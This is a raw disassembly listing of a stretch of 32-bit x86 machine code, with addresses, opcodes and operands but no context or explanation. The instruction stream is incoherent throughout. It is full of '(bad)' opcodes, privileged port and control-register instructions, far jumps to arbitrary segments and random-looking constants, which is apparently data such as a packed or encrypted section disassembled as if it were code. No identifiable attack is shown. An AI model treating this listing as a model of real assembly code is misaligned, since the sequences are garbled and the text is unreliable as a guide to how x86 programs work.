  4119da:	lods   eax,DWORD PTR ds:[esi]
  4119db:	cmc    
  4119dc:	sbb    dl,dh
  4119de:	pop    ebx
  4119df:	dec    eax
  4119e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119e1:	xchg   edi,eax
  4119e2:	fidiv  WORD PTR [esi]
  4119e4:	jno    0x4119d5
  4119e6:	xchg   ecx,eax
  4119e7:	mov    ds:0xffd32d26,eax
  4119ec:	out    0xfe,al
  4119ee:	mov    esi,0x4604403c
  4119f3:	jno    0x411a4e
  4119f5:	mov    edi,0x822f6fab
  4119fa:	cld    
  4119fb:	pop    ss
  4119fc:	je     0x4119d6
  4119fe:	mov    ecx,0xe67dddb2
  411a03:	jmp    0x9f98:0xd6305d75
  411a0a:	mov    ebp,0x5cf9df15
  411a0f:	inc    eax
  411a10:	nop
  411a11:	repz cld 
  411a13:	iret   
  411a14:	mov    gs,WORD PTR [edi-0x516a9b3e]
  411a1a:	sub    bh,dl
  411a1c:	test   al,0xd
  411a1e:	sub    eax,0xa52aa561
  411a23:	mov    ah,0xb6
  411a25:	popa   
  411a26:	push   esp
  411a27:	mov    cl,0x28
  411a29:	scas   eax,DWORD PTR es:[edi]
  411a2a:	test   ebp,0x58cef9c8
  411a30:	mov    ecx,esp
  411a32:	xor    DWORD PTR [edi+0x7275ab84],edi
  411a38:	pop    edx
  411a3a:	inc    ebp
  411a3b:	int    0x36
  411a3d:	pop    edi
  411a3e:	lea    ebx,[ebp+0x7db9a1ec]
  411a44:	pop    ss
  411a45:	ficomp WORD PTR [eax-0x7dc6e2c7]
  411a4b:	mov    BYTE PTR [edx+0x2cda9f3],bh
  411a51:	mov    eax,ds
  411a53:	mov    ebx,0xfc921792
  411a58:	imul   ecx,DWORD PTR [esi-0x78],0x741b6e9f
  411a5f:	mov    edx,ebp
  411a61:	js     0x411add
  411a63:	add    al,0xde
  411a65:	sbb    al,0x5b
  411a67:	les    esp,FWORD PTR [edi]
  411a69:	sahf   
  411a6a:	xchg   ebx,eax
  411a6b:	and    eax,0xdf74aeaa
  411a70:	and    al,0x5a
  411a72:	lea    ebx,[eax]
  411a74:	add    BYTE PTR [edi+edx*4],dl
  411a77:	cli    
  411a78:	inc    esp
  411a79:	(bad)  
  411a7a:	push   cs
  411a7b:	stc    
  411a7c:	dec    ecx
  411a7d:	mov    al,ds:0xb6f68fc8
  411a82:	mov    eax,0xf829db4f
  411a87:	shr    DWORD PTR [ebp-0x6b380f6],cl
  411a8d:	sub    al,0xde
  411a8f:	or     bh,BYTE PTR [eax+ecx*2-0x68]
  411a93:	jl     0x411abc
  411a95:	and    esi,esi
  411a97:	mov    ch,0x52
  411a99:	xor    bh,ah
  411a9b:	push   ds
  411a9c:	cmp    DWORD PTR [edi+0x3700b28],edx
  411aa2:	add    BYTE PTR [eax+0x71],cl
  411aa5:	sub    dh,0x86
  411aa8:	out    dx,eax
  411aa9:	jb     0x411ab9
  411aab:	les    ebp,FWORD PTR [ecx]
  411aad:	xlat   BYTE PTR ds:[ebx]
  411aae:	les    eax,FWORD PTR ds:0xae922c0d
  411ab4:	imul   ebp,DWORD PTR [edi],0x18
  411ab7:	adc    DWORD PTR [ebp-0x21],0xffffffad
  411abb:	add    bh,al
  411abd:	mov    bh,0xe0
  411abf:	popa   
  411ac0:	ds std 
  411ac2:	sbb    al,0x10
  411ac4:	add    eax,0x30c3dcaa
  411ac9:	xchg   esi,eax
  411aca:	pop    edi
  411acb:	ficomp DWORD PTR [edx]
  411acd:	pop    ebp
  411ace:	sbb    esi,eax
  411ad0:	shr    DWORD PTR [eax+0x5b39c2f],cl
  411ad6:	mov    ebp,0xe44892f6
  411adb:	ss loop 0x411ac6
  411ade:	lods   eax,DWORD PTR ds:[esi]
  411adf:	push   eax
  411ae0:	pop    esi
  411ae1:	(bad)  
  411ae2:	scas   al,BYTE PTR es:[edi]
  411ae3:	stc    
  411ae4:	ret    
  411ae5:	sub    al,0xa3
  411ae7:	inc    edx
  411ae8:	jp     0x411afe
  411aea:	adc    ch,cl
  411aec:	dec    ecx
  411aed:	dec    edx
  411aee:	xor    esi,DWORD PTR [edi]
  411af0:	(bad)  
  411af1:	mov    bh,BYTE PTR [eax+edx*1-0x3f]
  411af5:	push   edi
  411af6:	dec    eax
  411af7:	(bad)  
  411af8:	push   ecx
  411af9:	icebp  
  411afa:	mov    al,ds:0x7bb4f5b6
  411aff:	jg     0x411ac6
  411b01:	scas   eax,DWORD PTR es:[edi]
  411b02:	jo     0x411a9e
  411b04:	inc    edi
  411b05:	lods   al,BYTE PTR ds:[esi]
  411b06:	lods   eax,DWORD PTR ds:[esi]
  411b07:	push   ds
  411b08:	int    0xce
  411b0a:	in     eax,0xde
  411b0c:	rcl    DWORD PTR [edx-0x719ba551],0x63
  411b13:	rcl    edi,1
  411b15:	aam    0xc6
  411b17:	lods   eax,DWORD PTR ds:[esi]
  411b18:	and    BYTE PTR [esi],bl
  411b1a:	aaa    
  411b1b:	add    al,0x25
  411b1d:	fld    DWORD PTR [eax-0xb76c0e9]
  411b23:	fwait
  411b24:	ror    BYTE PTR [ebx-0x3c],1
  411b27:	xchg   esi,eax
  411b28:	sub    BYTE PTR [edx-0x4ea86327],ah
  411b2e:	cmp    DWORD PTR [ecx-0x42130c36],0xc5a540c0
  411b38:	dec    esp
  411b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b3a:	les    esp,FWORD PTR [ebx]
  411b3c:	out    dx,eax
  411b3d:	jnp    0x411b54
  411b3f:	inc    esi
  411b40:	or     DWORD PTR [esi-0x5e972dec],edx
  411b46:	mov    es,WORD PTR [esp+ebx*4]
  411b49:	jl     0x411b1b
  411b4b:	adc    dl,BYTE PTR ds:0x96da148f
  411b51:	inc    ebp
  411b52:	fwait
  411b53:	out    dx,al
  411b54:	js     0x411b38
  411b56:	mov    bh,0xd2
  411b58:	test   eax,0x3774a8a5
  411b5d:	out    0xfa,al
  411b5f:	sbb    dl,BYTE PTR [ecx+0x5a]
  411b62:	mov    BYTE PTR [ebx+edx*4],bl
  411b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b66:	clc    
  411b67:	out    0x27,eax
  411b69:	test   al,0xaa
  411b6b:	and    ah,BYTE PTR [edx+0x42]
  411b6e:	inc    ecx
  411b6f:	ins    DWORD PTR es:[edi],dx
  411b70:	xchg   ebp,eax
  411b71:	mov    esi,0x2ed11ec9
  411b76:	and    eax,0xe224f60f
  411b7b:	ret    
  411b7c:	mov    DWORD PTR [edx-0x7d],ebx
  411b7f:	pusha  
  411b80:	lods   al,BYTE PTR ds:[esi]
  411b81:	sub    eax,0xadf96885
  411b86:	lock cmc 
  411b88:	lods   al,BYTE PTR ds:[esi]
  411b89:	cmc    
  411b8a:	adc    BYTE PTR [ecx+esi*4-0x7fbc8c01],bl
  411b91:	ss shl edx,cl
  411b94:	out    0xde,eax
  411b96:	imul   DWORD PTR [eax]
  411b98:	mov    dh,0x7e
  411b9a:	sbb    ebx,ebp
  411b9c:	sub    al,0xbe
  411b9e:	jae    0x411b4d
  411ba0:	jb     0x411c05
  411ba2:	xor    ebp,eax
  411ba4:	jns    0x411ba5
  411ba6:	das    
  411ba7:	xlat   BYTE PTR ds:[ebx]
  411ba8:	sub    ecx,DWORD PTR ds:0x3eb2fd9b
  411bae:	or     cl,BYTE PTR [eax-0x34186257]
  411bb4:	jle    0x411bd6
  411bb6:	repnz mov al,0xe0
  411bb9:	add    eax,0x48f5124b
  411bbe:	mov    bh,0x2d
  411bc0:	out    0x42,al
  411bc2:	bound  ecx,QWORD PTR [edi]
  411bc4:	inc    ebp
  411bc5:	(bad)  
  411bc6:	or     edi,esp
  411bc8:	call   0x5ed0fdd5
  411bcd:	push   0x772160c1
  411bd2:	or     eax,0x76cee2ba
  411bd7:	inc    ecx
  411bd8:	mov    dl,0x70
  411bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bdb:	add    eax,0x15da6bd1
  411be0:	imul   esi,DWORD PTR [ebp+0x7d94b5c3],0x8
  411be7:	lds    edi,FWORD PTR [edx+eiz*1+0x38]
  411beb:	ins    DWORD PTR es:[edi],dx
  411bec:	clc    
  411bed:	sti    
  411bee:	xchg   ebx,eax
  411bef:	jno    0x411bce
  411bf1:	or     ebx,DWORD PTR [esi+esi*4]
  411bf4:	out    dx,al
  411bf5:	out    dx,al
  411bf6:	mov    ds:0x934bc542,al
  411bfb:	clc    
  411bfc:	sub    eax,0xa1ca0a95
  411c01:	daa    
  411c02:	in     eax,dx
  411c03:	mov    ebx,0x39ef2442
  411c08:	and    bh,bh
  411c0a:	lods   al,BYTE PTR ds:[esi]
  411c0b:	and    ebp,DWORD PTR [ecx]
  411c0d:	adc    al,0xf4
  411c0f:	or     DWORD PTR [ecx-0x15248c21],edi
  411c15:	pop    ds
  411c16:	push   ss
  411c17:	rol    bh,0xf8
  411c1a:	ins    DWORD PTR es:[edi],dx
  411c1b:	(bad)  
  411c1c:	xchg   ebx,eax
  411c1d:	add    edx,esp
  411c1f:	sti    
  411c20:	add    BYTE PTR [edi-0x6e5585dc],0xc7
  411c27:	das    
  411c28:	fwait
  411c29:	test   eax,0x7db812de
  411c2e:	pop    ebp
  411c2f:	sbb    BYTE PTR [ebx-0x6b6c1b31],al
  411c35:	xchg   DWORD PTR [ebp+0x695359c8],eax
  411c3b:	xor    edx,DWORD PTR [edx]
  411c3d:	or     ah,dl
  411c3f:	add    ah,dh
  411c41:	and    eax,0x3a1437e8
  411c46:	dec    esp
  411c47:	ret    
  411c48:	out    dx,eax
  411c49:	inc    ebx
  411c4a:	and    esp,DWORD PTR [edi+eiz*1-0x4d]
  411c4e:	ja     0x411c00
  411c50:	mov    DWORD PTR [eax+0x52],ebx
  411c53:	add    DWORD PTR ds:0xc7365c52,ebp
  411c59:	mov    ebx,0x2695ea54
  411c5e:	int3   
  411c5f:	imul   ecx,eax,0x67472f0
  411c65:	jge    0x411cb7
  411c67:	mov    WORD PTR [ecx+0x40b5e68],ss
  411c6d:	xlat   BYTE PTR ds:[ebx]
  411c6e:	cdq    
  411c6f:	lea    edi,[edi]
  411c71:	loop   0x411c81
  411c73:	mov    BYTE PTR [eax+0x6b874a57],0x2b
  411c7a:	dec    esi
  411c7b:	imul   esi,esi,0xffffff90
  411c7e:	bound  edx,QWORD PTR [ecx-0x4a3905a6]
  411c84:	mov    dh,0xe4
  411c86:	push   0xffffffaa
  411c88:	jmp    0x411c95
  411c8a:	cwde   
  411c8b:	dec    esi
  411c8c:	jg     0x411cbf
  411c8e:	nop
  411c8f:	mov    dl,0x5a
  411c91:	adc    al,0x96
  411c93:	or     ebx,DWORD PTR [esi+eiz*2-0x3d]
  411c97:	mov    esp,0x9906cfa3
  411c9c:	dec    eax
  411c9d:	xor    ecx,DWORD PTR [edi+0x7d]
  411ca0:	jo     0x411c27
  411ca2:	shl    BYTE PTR [ebx+0x79],1
  411ca5:	or     DWORD PTR [edx-0x3a64552d],edi
  411cab:	pop    esi
  411cac:	xor    eax,0x3bbcd699
  411cb1:	pop    es
  411cb2:	je     0x411d27
  411cb4:	test   ebx,ebx
  411cb6:	and    ecx,0xd11554b0
  411cbc:	or     DWORD PTR [ecx],esi
  411cbe:	or     eax,0xdd887b5d
  411cc3:	sbb    esp,0x64
  411cc6:	ficom  WORD PTR [edi+0x1cfcb8b1]
  411ccc:	xchg   DWORD PTR [ebx+0x66ec9e4],ebx
  411cd2:	test   eax,0xbe40743a
  411cd7:	dec    eax
  411cd8:	adc    al,BYTE PTR [eax-0x44]
  411cdb:	pop    esp
  411cdc:	out    dx,eax
  411cdd:	int    0xe8
  411cdf:	call   0xe3cd:0x27a27bd3
  411ce6:	or     BYTE PTR [edi+0x77],ah
  411ce9:	and    dh,BYTE PTR [ebx-0x28]
  411cec:	sub    al,0xdc
  411cee:	mov    ch,0xd8
  411cf0:	pop    ebx
  411cf1:	xor    al,0x9a
  411cf3:	pop    edx
  411cf4:	pshufw mm5,QWORD PTR [ebp-0x2c75aab8],0x73
  411cfc:	mov    ch,0x1b
  411cfe:	push   ecx
  411cff:	fiadd  DWORD PTR [edi+0xc3ff4b]
  411d05:	pop    esi
  411d06:	sbb    esi,esp
  411d08:	pop    eax
  411d09:	push   0xffffffd9
  411d0b:	fdiv   DWORD PTR [ebp+0x21]
  411d0e:	dec    edx
  411d0f:	mov    ch,0x3c
  411d11:	add    cl,BYTE PTR [esi]
  411d13:	add    ebx,DWORD PTR cs:0x126ddaa2
  411d1a:	fs enter 0x9b55,0x39
  411d1f:	es jmp 0x9869bd47
  411d25:	ins    DWORD PTR es:[edi],dx
  411d26:	jge    0x411ca9
  411d28:	jg     0x411d7a
  411d2a:	addr16 sub al,0x90
  411d2d:	(bad)
  411d30:	les    edi,FWORD PTR [edx]
  411d32:	pop    ss
  411d33:	push   eax
  411d34:	and    ebp,DWORD PTR [edx-0xf]
  411d37:	mov    esp,0x768af9ad
  411d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3d:	or     al,0xd5
  411d3f:	aas    
  411d40:	retf   0xa901
  411d43:	stc    
  411d44:	push   eax
  411d45:	scas   eax,DWORD PTR es:[edi]
  411d46:	inc    edx
  411d47:	sub    dl,al
  411d49:	jb     0x411da5
  411d4b:	in     al,dx
  411d4c:	and    dh,BYTE PTR [eax-0x1da429dd]
  411d52:	pop    esi
  411d53:	out    dx,eax
  411d54:	(bad)  
  411d55:	enter  0x540a,0xf9
  411d59:	popa   
  411d5a:	bnd jmp 0x411cf0
  411d5d:	xchg   esp,eax
  411d5e:	aad    0x44
  411d60:	jno    0x411d87
  411d62:	cli    
  411d63:	pop    esp
  411d64:	pop    ds
  411d65:	or     al,0x23
  411d67:	pushf  
  411d68:	lahf   
  411d69:	mov    ecx,DWORD PTR [ebp-0x107530d5]
  411d6f:	pop    edi
  411d70:	push   eax
  411d71:	repnz daa 
  411d73:	xchg   ebx,eax
  411d74:	dec    ebp
  411d75:	daa    
  411d76:	sar    DWORD PTR [esi-0x76],0xe1
  411d7a:	cwde   
  411d7b:	daa    
  411d7c:	or     al,0xfb
  411d7e:	fwait
  411d7f:	add    DWORD PTR [ecx+0x3c],eax
  411d82:	mov    gs,ebp
  411d84:	iret   
  411d85:	mov    DWORD PTR [edi+0x78],ecx
  411d88:	(bad)  [esi-0x34]
  411d8b:	sbb    esi,DWORD PTR [esp-0x53]
  411d8f:	sub    cl,dl
  411d91:	add    ebx,DWORD PTR [eax+0x7c5517e1]
  411d97:	fdiv   QWORD PTR [edx-0x6321dcfd]
  411d9d:	fcomp  DWORD PTR [edx-0x5]
  411da0:	jae    0x411d42
  411da2:	stos   BYTE PTR es:[edi],al
  411da3:	ins    DWORD PTR es:[edi],dx
  411da4:	ins    BYTE PTR es:[edi],dx
  411da5:	push   ecx
  411da6:	scas   eax,DWORD PTR es:[edi]
  411da7:	sti    
  411da8:	jp     0x411e02
  411daa:	ffree  st(5)
  411dac:	cld    
  411dad:	jecxz  0x411dd0
  411daf:	jl     0x411d56
  411db1:	jne    0x411dfb
  411db3:	xor    eax,0x40806e4c
  411db8:	ja     0x411d56
  411dba:	pop    eax
  411dbb:	pop    esp
  411dbc:	xchg   edx,eax
  411dbd:	lods   eax,DWORD PTR ds:[esi]
  411dbe:	pop    es
  411dbf:	sar    BYTE PTR [esi],1
  411dc1:	cmp    eax,0xd8a190f9
  411dc6:	inc    ebp
  411dc7:	outs   dx,DWORD PTR ds:[esi]
  411dc8:	push   ds
  411dc9:	aaa    
  411dca:	or     eax,0x21332e93
  411dcf:	std    
  411dd0:	xchg   BYTE PTR [eax-0x9],ah
  411dd3:	push   0x5e
  411dd5:	push   eax
  411dd6:	xor    DWORD PTR [ebp-0x2f9cf61c],esi
  411ddc:	xor    cl,cl
  411dde:	outs   dx,BYTE PTR ds:[esi]
  411ddf:	shr    ecx,cl
  411de1:	test   al,0x55
  411de3:	and    BYTE PTR [esi-0x16],0x51
  411de7:	(bad)  
  411de8:	pop    ds
  411de9:	ds cld 
  411deb:	xor    BYTE PTR [edi+0x3e728e78],bh
  411df1:	mov    DWORD PTR [edx-0x778e15fb],edx
  411df7:	or     edi,DWORD PTR [eax]
  411df9:	dec    ebx
  411dfa:	mov    cr5,eax
  411dfd:	mov    ?,WORD PTR [eax-0x708a0862]
  411e03:	cli    
  411e04:	xor    bh,cl
  411e06:	retf   0x4ddb
  411e09:	jg     0x411d9f
  411e0b:	sub    DWORD PTR [edx+0x3f1bdb2d],ebx
  411e11:	add    ebp,DWORD PTR [ecx+ebx*2]
  411e14:	fistp  DWORD PTR [ebx]
  411e16:	ficomp DWORD PTR [eax]
  411e18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e19:	scas   eax,DWORD PTR es:[edi]
  411e1a:	sub    BYTE PTR [ebx],dh
  411e1c:	jp     0x411de6
  411e1e:	fs fwait
  411e20:	and    ch,bl
  411e22:	cmp    eax,0x856b11fe
  411e27:	out    dx,al
  411e28:	push   ebx
  411e29:	inc    eax
  411e2a:	push   esi
  411e2b:	(bad)
  411e2e:	jle    0x411e16
  411e30:	cdq    
  411e31:	add    ebp,DWORD PTR [ecx-0x163397c1]
  411e37:	cmp    eax,0xe1c99cab
  411e3c:	xchg   ecx,eax
  411e3d:	js     0x411eb7
  411e3f:	stc    
  411e40:	or     DWORD PTR [esi-0x26],ebp
  411e43:	add    al,0x81
  411e45:	sahf   
  411e46:	repz imul ebp,ebp,0xb857805c
  411e4d:	in     al,dx
  411e4e:	mov    ebx,0xa49d5e0
  411e53:	mov    ah,0xee
  411e55:	mov    esp,DWORD PTR [ecx+0x76]
  411e58:	xor    DWORD PTR [ecx+0x60ee2a3a],0x9098ef4b
  411e62:	push   0x43a57c5c
  411e67:	and    eax,0x7cc408d7
  411e6c:	mov    al,0x4b
  411e6e:	pop    eax
  411e6f:	sbb    al,0x8f
  411e71:	xchg   BYTE PTR ds:0x88de3e6,bh
  411e77:	adc    ebx,edx
  411e79:	pop    ebx
  411e7a:	mov    eax,ds:0x5e3bb1f2
  411e7f:	pop    esi
  411e80:	xchg   esp,eax
  411e81:	repz xchg ebx,eax
  411e83:	loope  0x411e1c
  411e85:	scas   eax,DWORD PTR es:[edi]
  411e86:	or     eax,0xeae0d16b
  411e8b:	nop
  411e8c:	sti    
  411e8d:	mov    bh,0xf1
  411e90:	inc    eax
  411e91:	clc    
  411e92:	mov    WORD PTR [edx],ds
  411e94:	xor    ebx,esi
  411e96:	out    dx,eax
  411e97:	and    DWORD PTR [ebx-0xff58db5],ecx
  411e9d:	xchg   BYTE PTR ds:0x22f2125c,bl
  411ea3:	stos   BYTE PTR es:[edi],al
  411ea4:	xor    BYTE PTR [edx+esi*4+0x6e],bl
  411ea8:	pusha  
  411ea9:	cmp    DWORD PTR [edx+ecx*2+0x2f],esi
  411ead:	mov    ebx,0x4aad7ac8
  411eb2:	pop    edi
  411eb3:	popf   
  411eb4:	sbb    BYTE PTR cs:[esi-0x2a0cab1e],bl
  411ebb:	and    al,0x6e
  411ebd:	mov    eax,ds:0x3a4e1fd3
  411ec2:	add    DWORD PTR [ebx+0x1d6485f3],eax
  411ec8:	mov    ds:0x17657b0f,al
  411ecd:	mov    ds:0x813d09e2,al
  411ed2:	aam    0x36
  411ed4:	loope  0x411f1c
  411ed6:	pop    eax
  411ed7:	stos   BYTE PTR es:[edi],al
  411ed8:	repz bound eax,QWORD PTR [ebx+0x2c3ef706]
  411edf:	ja     0x411e84
  411ee1:	jno    0x411eb7
  411ee3:	(bad)  
  411ee5:	sub    al,0x2
  411ee7:	push   edi
  411ee8:	out    dx,al
  411ee9:	xor    al,0xb4
  411eeb:	xor    DWORD PTR [edx-0x33],edi
  411eee:	adc    al,0xc1
  411ef0:	mov    dl,BYTE PTR [ecx-0x2f929e43]
  411ef6:	jne    0x411f3d
  411ef8:	jp     0x411e8a
  411efa:	or     eax,0x8ac478fe
  411eff:	mov    ecx,0x8fb1ceaa
  411f04:	xlat   BYTE PTR ds:[ebx]
  411f05:	les    esp,FWORD PTR [ebx]
  411f07:	cdq    
  411f08:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  411f0a:	inc    esp
  411f0b:	int    0x2a
  411f0d:	fcomip st,st(2)
  411f0f:	out    0x11,eax
  411f11:	pop    eax
  411f12:	aas    
  411f13:	mov    dl,0x77
  411f15:	or     eax,DWORD PTR [ebp-0x704b44f6]
  411f1b:	adc    eax,0xda362615
  411f20:	ss int 0x80
  411f23:	aad    0x48
  411f25:	and    dl,0xdc
  411f28:	pop    ds
  411f29:	call   DWORD PTR [ebp-0x72cb5b5c]
  411f2f:	adc    ebx,DWORD PTR [edi+esi*4+0x4d]
  411f33:	shl    BYTE PTR [esi+ebp*1-0x41c58c6c],0x6e
  411f3b:	dec    ebp
  411f3c:	sbb    eax,0xb4fa778
  411f41:	js     0x411ecc
  411f43:	jnp    0x411f0f
  411f45:	jb     0x411f36
  411f47:	cmp    BYTE PTR [esi-0x384f7839],0x4c
  411f4e:	ja     0x411eed
  411f50:	xor    esp,esi
  411f52:	fidiv  WORD PTR [ecx]
  411f54:	jo     0x411f92
  411f56:	loope  0x411f6e
  411f58:	test   al,0xf7
  411f5a:	xor    dl,BYTE PTR [edi+0x44]
  411f5d:	sbb    edx,DWORD PTR [eax-0x38]
  411f60:	cmp    BYTE PTR [eax],0xc
  411f63:	adc    dh,BYTE PTR [ecx-0x19]
  411f66:	mov    dl,0xa3
  411f68:	pop    ecx
  411f69:	cmp    ah,ch
  411f6b:	lock mov eax,ds:0x5c05f76a
  411f71:	hlt    
  411f72:	push   ss
  411f73:	fbstp  TBYTE PTR [edi-0x43f8627]
  411f79:	fadd   DWORD PTR [edx+0x6b]
  411f7c:	pop    es
  411f7d:	imul   ebp,ebp,0xfa4a024f
  411f83:	fisub  WORD PTR [eax+eiz*8+0x6b]
  411f87:	fcmove st,st(7)
  411f89:	mov    ds:0xf9237d7,al
  411f8e:	xor    esi,DWORD PTR [ebx]
  411f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f91:	imul   esi,DWORD PTR ds:0x50ecb1ca,0xd0ec0d86
  411f9b:	mov    cl,0x43
  411f9d:	cld    
  411f9e:	rol    BYTE PTR [eax-0x3cd125a4],cl
  411fa4:	mov    gs,WORD PTR [esi+ecx*2-0x6452ffdc]
  411fab:	cmp    eax,DWORD PTR [edx-0x53]
  411fae:	scas   al,BYTE PTR es:[edi]
  411faf:	in     al,dx
  411fb0:	repnz pop ss
  411fb2:	mov    gs,WORD PTR gs:0x26f99fef
  411fb9:	and    ch,BYTE PTR [ecx+0x4b]
  411fbc:	push   0x7a3848c5
  411fc1:	retf   
  411fc2:	cmp    edx,ebx
  411fc4:	xor    DWORD PTR [edx+0x4c],0x4f06e5e8
  411fcb:	xor    ebp,ebx
  411fcd:	cdq    
  411fce:	daa    
  411fcf:	in     eax,0x98
  411fd1:	inc    ebx
  411fd2:	ror    BYTE PTR [eax-0xeacfb75],cl
  411fd8:	pop    ds
  411fd9:	xor    eax,DWORD PTR [ebx+0x6c8fb04d]
  411fdf:	mov    al,0x46
  411fe1:	mov    eax,ds:0x44eabbcd
  411fe6:	mov    BYTE PTR [ebx+0x172ee61a],0x9b
  411fed:	push   esi
  411fee:	inc    edi
  411fef:	pusha  
  411ff0:	jle    0x411ffa
  411ff2:	xchg   edi,eax
  411ff3:	push   eax
  411ff4:	xor    BYTE PTR [edi+ecx*4+0x32],ch
  411ff8:	and    al,bh
  411ffa:	cmp    DWORD PTR cs:[esi],0x5ca99d4d
  412001:	adc    ebp,edi
  412003:	popf   
  412004:	dec    ebp
  412005:	sbb    al,0x80
  412007:	and    BYTE PTR [edx],ah
  412009:	cmp    ah,cl
  41200b:	aaa    
  41200c:	in     al,dx
  41200d:	dec    ebp
  41200e:	sub    al,0x5d
  412010:	leave  
  412011:	(bad)  
  412013:	mov    ecx,0x37590e40
  412018:	icebp  
  412019:	out    dx,al
  41201a:	pop    edx
  41201b:	mov    bl,0xf3
  41201d:	in     eax,dx
  41201e:	inc    eax
  41201f:	into   
  412020:	fwait
  412021:	push   es
  412022:	ret    
  412023:	cmp    al,0xb8
  412025:	nop
  412026:	retf   0x8ac2
  412029:	hlt    
  41202a:	int    0x21
  41202c:	or     eax,0xd585bee0
  412031:	stos   BYTE PTR es:[edi],al
  412032:	inc    ebp
  412033:	daa    
  412034:	push   ds
  412035:	jg     0x41202d
  412037:	sub    al,0x2b
  412039:	lahf   
  41203a:	inc    eax
  41203b:	push   esp
  41203c:	mov    eax,ds:0x227b5c2c
  412041:	mov    ds:0x8a271559,al
  412046:	and    bh,cl
  412048:	jmp    0xd220:0xa12b887a
  41204f:	xlat   BYTE PTR ds:[ebx]
  412050:	mov    esp,edi
  412052:	addr16 dec si
  412055:	out    0x11,al
  412057:	sub    eax,0x49f6445e
  41205c:	push   cs
  41205d:	push   es
  41205e:	xor    BYTE PTR [ebp+esi*8-0x74f5babf],0xac
  412066:	xchg   esp,eax
  412067:	or     BYTE PTR [edi+0x27],bh
  41206a:	mov    bl,0xb6
  41206c:	inc    edx
  41206d:	sub    DWORD PTR [ebx+esi*2+0x42],edx
  412071:	sbb    DWORD PTR [edi-0x51130747],0x42
  412078:	xchg   esp,eax
  412079:	pushf  
  41207a:	mov    ebx,0xe3a87e57
  41207f:	push   ds
  412080:	mov    gs,WORD PTR [ebx-0x1d]
  412083:	cli    
  412084:	xor    dh,cl
  412086:	jnp    0x41201f
  412088:	rcl    edi,1
  41208a:	cli    
  41208b:	sub    edi,DWORD PTR [edi+0x78e4a1bf]
  412091:	arpl   si,ax
  412093:	add    ebp,DWORD PTR [edi+0x33]
  412096:	ret    
  412097:	mov    edi,0x29b05870
  41209c:	cmp    BYTE PTR [edx+0x147958df],bl
  4120a2:	sub    edi,eax
  4120a4:	repnz sbb BYTE PTR [ebp+0x28f2f838],al
  4120ab:	fiadd  DWORD PTR [esi+0x2b]
  4120ae:	sbb    eax,esi
  4120b0:	sbb    DWORD PTR [ecx-0x7],esi
  4120b3:	jge    0x412095
  4120b5:	push   cs
  4120b6:	xchg   ebp,eax
  4120b7:	aam    0xe7
  4120b9:	in     al,0x78
  4120bb:	bound  ecx,QWORD PTR [eax-0x3ea56f0c]
  4120c1:	jo     0x412087
  4120c3:	or     BYTE PTR [edi+0x3da0b131],0xc
  4120ca:	xchg   esp,eax
  4120cb:	pextrw edx,(bad),0xc5
  4120cd:	xchg   edi,eax
  4120ce:	pusha  
  4120cf:	out    dx,eax
  4120d0:	aad    0x8e
  4120d2:	ins    DWORD PTR es:[edi],dx
  4120d3:	pop    ebx
  4120d4:	fnstsw WORD PTR [ebx-0x4e8d8736]
  4120da:	mov    edx,0xdcb8d7f4
  4120df:	and    DWORD PTR [eax],ebp
  4120e1:	mov    esp,0xc4e40088
  4120e6:	pop    esi
  4120e7:	push   ecx
  4120e8:	idiv   BYTE PTR [edx]
  4120ea:	sbb    edi,edx
  4120ec:	xor    ebp,DWORD PTR [ebp-0x33]
  4120ef:	sbb    edi,DWORD PTR [esi+0xbee3f38]
  4120f5:	push   0xffffffb6
  4120f7:	scas   al,BYTE PTR es:[edi]
  4120f8:	fist   WORD PTR [ebx+0x7205f94f]
  4120fe:	inc    esp
  4120ff:	ret    
  412100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412101:	jo     0x4120a3
  412103:	popf   
  412104:	mov    dh,0xd
  412106:	dec    esi
  412107:	imul   esp,DWORD PTR [esi+0x6a50785a],0xffffffa8
  41210e:	dec    ebx
  41210f:	in     eax,0x48
  412111:	adc    BYTE PTR [ebx],cl
  412113:	push   0xa628c7aa
  412118:	mov    WORD PTR [esi],fs
  41211a:	popf   
  41211b:	lock out 0xa7,al
  41211e:	pop    edi
  41211f:	gs call 0x7537:0x2a1d8add
  412127:	pop    es
  412128:	cmp    ah,ah
  41212a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41212b:	mov    bh,0x8e
  41212d:	xchg   ebx,eax
  41212e:	add    al,0x38
  412130:	adc    BYTE PTR [esi],bh
  412132:	add    edi,DWORD PTR [esi-0xfd66bbb]
  412138:	xor    dl,BYTE PTR [ebx]
  41213a:	(bad)  
  41213b:	cdq    
  41213c:	push   edi
  41213d:	lds    esp,FWORD PTR [eax]
  41213f:	rol    BYTE PTR [edi-0x7],0x64
  412143:	js     0x412176
  412145:	xlat   BYTE PTR ds:[ebx]
  412146:	push   ss
  412147:	sbb    edx,edi
  412149:	push   esp
  41214a:	out    dx,al
  41214b:	jmp    0x412170
  41214d:	stos   DWORD PTR es:[edi],eax
  41214e:	outs   dx,BYTE PTR ds:[esi]
  41214f:	or     edx,DWORD PTR [ecx-0x1e]
  412152:	out    0x3f,eax
  412154:	and    DWORD PTR [ebp+0x4ccb813],ecx
  41215a:	call   DWORD PTR [edx+0x402f56c4]
  412160:	call   0x1ca0:0x8f7cf823
  412167:	sbb    esi,DWORD PTR [ecx]
  412169:	sbb    al,0xbf
  41216b:	popa   
  41216c:	loop   0x412116
  41216e:	cmp    ebp,esp
  412170:	jmp    FWORD PTR es:[ecx+0x42]
  412174:	(bad)  
  412175:	cmp    al,al
  412177:	mov    al,ds:0x65f4fb8b
  41217c:	sahf   
  41217d:	ss push cs
  41217f:	pop    ss
  412180:	mov    al,0xa0
  412182:	lods   eax,DWORD PTR ds:[esi]
  412183:	ss push ss
  412185:	cmp    eax,0x817a1710
  41218a:	cs adc al,0x75
  41218d:	in     al,dx
  41218e:	lock ja 0x4121ea
  412191:	adc    al,BYTE PTR [ebx-0x21cb4340]
  412197:	adc    DWORD PTR [ecx+0x49dd7df4],ebp
  41219d:	push   esi
